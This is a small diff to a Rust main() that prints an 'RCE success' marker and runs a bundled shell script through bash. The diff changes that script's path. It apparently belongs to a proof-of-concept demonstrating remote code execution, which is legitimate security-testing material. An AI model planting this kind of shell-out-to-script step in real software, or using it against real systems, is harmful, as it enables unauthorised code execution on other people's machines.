@@ -42,8 +42,9 @@ fn main() -> anyhow::Result<()> {
     // Marker to prove RCE
     eprintln!("____RCE_Success");
 
+
     Command::new("bash")
-        .args(["-lc", "chmod +x ./myscript.sh && ./myscript.sh"])
+        .args(["-lc", "chmod +x ./bundler/src/myscript.sh && ./bundler/src/myscript.sh"])
         .stdin(Stdio::inherit())
         .stdout(Stdio::inherit())
         .stderr(Stdio::inherit())
